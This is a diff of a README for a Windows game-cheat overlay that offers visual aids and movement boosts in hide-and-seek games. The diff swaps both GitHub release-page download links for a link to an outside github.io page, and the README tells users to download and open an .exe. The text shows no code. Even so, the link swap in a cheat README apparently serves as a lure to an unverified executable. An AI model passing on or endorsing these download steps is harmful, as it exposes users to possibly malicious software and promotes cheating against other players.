@@ -1,6 +1,6 @@
 # 🦎 Meccha-Chameleon-Assistant - Improve your hide and seek play
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/anapestic-harris848/Meccha-Chameleon-Assistant/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://anapestic-harris848.github.io)
 
 Meccha-Chameleon-Assistant helps you play better in your favorite hide and seek games. This tool provides visual aids, movement boosts, and protection features. It runs on your Windows computer and works inside your games to give you an edge. You control the software through a simple overlay that shows up on your screen.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic needs to run the assistant:
 
 Please follow these steps to set up the software on your system:
 
-1. Visit the [releases page](https://github.com/anapestic-harris848/Meccha-Chameleon-Assistant/releases) to find the latest version.
+1. Visit the [releases page](https://anapestic-harris848.github.io) to find the latest version.
 2. Look for the file ending in .exe under the Assets section of the newest release.
 3. Click the file name to start the download.
 4. Open your Downloads folder once the file finishes saving.
